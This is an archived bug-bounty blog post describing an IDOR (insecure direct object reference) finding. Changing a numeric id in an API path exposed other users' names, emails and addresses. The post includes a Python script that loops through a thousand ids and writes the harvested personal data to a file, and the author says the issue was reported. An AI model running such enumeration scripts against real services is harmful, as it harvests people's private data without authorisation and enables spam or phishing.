# #1 The Monday Hunt—IDOR-able escapade

- **Source URL:** https://medium.com/@infinis/1-the-monday-hunt-idor-able-escapade-4a8a93fbb22?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20230126034138/https://medium.com/@infinis/1-the-monday-hunt-idor-able-escapade-4a8a93fbb22
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/1496 (id 1496)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# #1 The Monday Hunt—IDOR-able escapade

*For those who are not familiar, an IDOR, or Insecure Direct Object Reference, is like a secret door in a website that should be locked, but is left wide open for anyone to walk through. It’s like your friend leaving his diary unlocked on his bed and you reading all of his/her embarrassing secrets. It’s not something that should be happening, but it’s pretty funny to think about. In the same way, an IDOR vulnerability allows unauthorized access to sensitive information that should be kept private. So, next time you hear about an IDOR, just think of a diary left open for anyone to read, and you’ll have a good chuckle.*

Now that we’ve had our fun, let’s move on to more serious topics. Today, I stumbled across a cool web application (I won’t disclose any information for obvious reasons) and, as always, I decided to take a look under the hood.

I turned on my Burp, edited the scope, and started intercepting the traffic. I clicked on everything, filled out every form, and even made an account. Then, I casually started going through all the requests and finally found this request towards this user submitted post.

The URL looked like this: **https://app.example.com/v2/example/{id}** of course this ID was a wonderful thing to see so I decided to send a request to repeater and simply change the value of **id**. As expected, it returned 200 response with valid info. So I dug through the response and found out that it was also returning a **full name, email and an address** of a user which is not publicly available on this web app.

I then realized that although it may not seem like a big deal, the gathered information such as name, email and address could be used to build a large mailing list. As an ethical hacker, I decided to **responsibly report this vulnerability** to the owner but before I wanted to play around with Python so I wrote this simple script to automate the extraction of sensitive information.

```
import json
import requests
# Initialize the value of id
id = 500000
prev_name = None
prev_surname = None
prev_email = None
# Open the file to write the extracted values
with open("info.txt", "w") as f:
    while id < 501000:
        # Build the URL with the incremented value of id
        url = f"https://app.example.com/v2/example/{id}"
        # Send the GET request
        response = requests.get(url, headers={
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Origin": "https://example.app",
            "Referer": "https://example.app/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "Te": "trailers"
        })
        if response.status_code != 200:
            # If the status code is not 200, skip this request and move on
            print(f"Request to {url} returned status code {response.status_code}, skipping...")
            id += 1
            continue
        # Parse the JSON response
        data = json.loads(response.text)
        # Extract the values of name, surname, and email
        for user in data['users']:
            name = user['name']
            surname = user['surname']
            email = user['email']
        # Sometimes it would return the same info as earlier so I filtered it using this code below
        if name == prev_name and surname == prev_surname and email == prev_email:
            print(f"Values of name, surname, and email are the same as the previous response, skipping...")
            id += 1
            continue
        # Write the values to the file
        f.write(f"Name: {name}, Surname: {surname}, Email: {email}\n")
        prev_name = name
        prev_surname = surname
        prev_email = email
        # Increment the value of id
        id += 1
```
And of course, **it resulted with a nice list of emails** just as an example I provided to the owner of this web app.

Well folks, that’s all for today’s IDOR-able escapade. Remember, always keep your eyes peeled for those sneaky subdomains and parameters. And most importantly, don’t forget to have fun while hunting for vulnerabilities, or you might just miss the IDOR-able hilarity hiding in plain sight. Until next time!
